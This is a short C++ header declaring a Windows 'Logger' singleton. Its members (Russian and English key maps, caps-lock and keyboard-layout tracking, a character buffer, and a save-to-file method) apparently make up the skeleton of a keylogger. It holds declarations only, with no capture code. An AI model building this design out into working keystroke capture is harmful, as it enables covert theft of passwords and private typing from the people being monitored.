#pragma once
#include <string>
#include <map>
#include <vector>
#include <Windows.h>
#include <iostream>
#include <fstream>

#define MAKELANGID(p, s)       ((((WORD  )(s)) << 10) | (WORD  )(p))
#define PRIMARYLANGID(lgid)    ((WORD  )(lgid) & 0x3ff)
#define SUBLANGID(lgid)        ((WORD  )(lgid) >> 10) 

using namespace std;

class Logger
{
private:
	static Logger* instance;
	string simbols = "";
	static LANGID langId;
	bool is_capslock = false;
	static map <int, vector<char>> btnKeyRu;
	static map <int, vector<char>> btnKeyEn;
	DWORD processId;
	HWND hwnd;
	HKL kLayout;
	wchar_t wChar;
	Logger();
	void put(char simbol);
	string get();
	void saver();
	bool checkUpper();
	char toUpper(char letter);
	char toLower(char letter);
	void saveToFile(); // test
public:
	static Logger* getInstance();
	static void run();
};

